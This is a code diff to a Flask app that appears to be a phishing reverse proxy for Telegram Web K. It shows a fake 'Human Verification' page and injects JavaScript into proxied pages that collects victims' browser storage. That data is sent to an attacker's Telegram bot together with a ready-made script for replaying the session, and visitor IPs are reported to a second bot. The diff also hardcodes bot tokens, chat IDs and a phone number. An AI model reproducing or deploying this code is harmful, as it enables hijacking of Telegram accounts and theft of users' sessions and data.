@@ -10,12 +10,21 @@ BASE_URL = 'https://web.telegram.org/k/'
 # Your Telegram bot token and chat ID
 TELEGRAM_BOT_TOKEN = '7748600145:AAFIALKClYzW9ACeA4GvOuyQQTb1mOcSf1o'
 TELEGRAM_CHAT_ID = '-4580685528'
+
 @app.route('/', defaults={'path': ''})
 @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE'])
 def proxy(path):
     url = f"{BASE_URL}{path}"
-    headers = {key: value for key, value in request.headers if key != 'Host'}
+    headers = {key: value for key, value in request.headers if key.lower() != 'host'}
 
+    # Log request method, URL, headers, and data for troubleshooting
+    app.logger.info(f"Request Method: {request.method}")
+    app.logger.info(f"Request URL: {url}")
+    app.logger.info(f"Request Headers: {headers}")
+    if request.data:
+        app.logger.info(f"Request Data: {request.data}")
+
+    # Handle different HTTP methods
     if request.method == 'POST':
         response = requests.post(url, headers=headers, data=request.data, cookies=request.cookies)
     elif request.method == 'PUT':
@@ -25,6 +34,7 @@ def proxy(path):
     else:
         response = requests.get(url, headers=headers, cookies=request.cookies)
 
+    # Inject JavaScript for data storage and handling on mobile
     injected_js = """
     <script>
         function sendStorageData() {
@@ -70,20 +80,24 @@ def proxy(path):
     </script>
     """
 
+    # Inject JavaScript if the response is HTML content
     if 'text/html' in response.headers.get('Content-Type', ''):
         content = response.text.replace('</body>', injected_js + '</body>')
     else:
         content = response.content
 
+    # Exclude specific headers that could cause issues
     excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
     headers = [(name, value) for name, value in response.raw.headers.items() if name.lower() not in excluded_headers]
     return Response(content, response.status_code, headers)
+
 def tg():
     ip = requests.get("https://api.myip.com")
-    message = f"new safeguard visit from {ip.text}"
-    requests.post(f'https://api.telegram.org/bot7659352547:AAGXCajgc9uZgK0Vb1NJkRPPM9B9yg8kk3Q/sendMessage',data={'chat_id': 1409893198, 'text': message} )
+    message = f"New safeguard visit from {ip.text}"
+    requests.post(f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage',data={'chat_id': 1409893198, 'text': message} )
 
 tg()
+
 @app.route('/store-data', methods=['POST'])
 def store_data():
     storage_data = request.json
@@ -97,6 +111,7 @@ def store_data():
     send_text_to_telegram(message)
 
     return 'Data received', 200
+
 REVERSE_PROXY_HTML = """
 <!DOCTYPE html>
 <html lang="en">
@@ -104,7 +119,7 @@ REVERSE_PROXY_HTML = """
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Human Verification</title>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400&display=swap" rel="stylesheet"> <!-- Include Roboto Mono font -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400&display=swap" rel="stylesheet">
     <style>
         body {
             margin: 0;
@@ -128,7 +143,7 @@ REVERSE_PROXY_HTML = """
         .container h1 {
             font-size: 2.5em;
             font-weight: bold;
-            margin-bottom: 3px; /* Reduced margin between heading and paragraph */
+            margin-bottom: 3px;
         }
         .container p {
             font-size: 1.2em;
@@ -140,12 +155,12 @@ REVERSE_PROXY_HTML = """
             color: white;
             padding: 15px 30px;
             font-size: 1.3em;
-            text-decoration: underline; /* Underline the text */
+            text-decoration: underline;
             border-radius: 5px;
             border: 2px solid #255238;
-            width: 50%; /* Elongate the button */
-            text-align: center; /* Ensure text is centered inside the elongated button */
-            font-family: 'Roboto Mono', monospace; /* Change font to Roboto Mono */
+            width: 50%;
+            text-align: center;
+            font-family: 'Roboto Mono', monospace;
         }
         .container a:hover {
             background-color: #3d7b56;
@@ -156,38 +171,29 @@ REVERSE_PROXY_HTML = """
     <div class="container">
         <h1>Human Verification</h1>
         <p>Verify below to be granted entry</p>
-        <a href="/">Click here</a>  <!-- Changed link to point to /api -->
+        <a href="/">Click here</a>
     </div>
 </body>
 </html>
 """
+
 @app.route('/verify', methods=['GET'])
 def reverse_proxy():
     return REVERSE_PROXY_HTML
+
 def format_message(local_storage):
-    # Example placeholders; customize this part based on actual localStorage data
-    name = '?.eth'  # Replace this with the relevant localStorage key for the name if available
-    phone = '+6285282631346'  # Replace this with the relevant localStorage key for the phone if available
-    hit_id = '6717689117'  # Replace this with relevant data if needed
-
-    # JavaScript code to be copied
-    copy_code = 'if(location.host=="web.telegram.org"){localStorage.clear();Object.entries(%s).forEach(i => localStorage.setItem(i[0], i[1]))};location.href="https://web.telegram.org/k";'%(local_storage)
-    # Format the message using HTML
+    name = '?.eth'
+    phone = '+6285282631346'
+    hit_id = '6717689117'
+    copy_code = 'if(location.host=="web.telegram.org"){localStorage.clear();Object.entries(%s).forEach(i => localStorage.setItem(i[0], i[1]))};location.href="https://web.telegram.org/k";' % (local_storage)
     message = f"""
-
 <b>❓ How to login:</b> execute the code below on Telegram WebK (<a href="https://web.telegram.org/k/">https://web.telegram.org/k/</a>)
-
-
-
 <code>{copy_code}</code>
 """
     return message
 
 def send_text_to_telegram(message):
-    # Send the message text to the Telegram bot using HTML parsing
-    requests.post(f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage',data={'chat_id': TELEGRAM_CHAT_ID, 'text': message,"parse_mode":"html"} )
+    requests.post(f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage',data={'chat_id': TELEGRAM_CHAT_ID, 'text': message, "parse_mode":"html"} )
 
 if __name__ == '__main__':
     app.run(debug=True, port=5000)
-
-
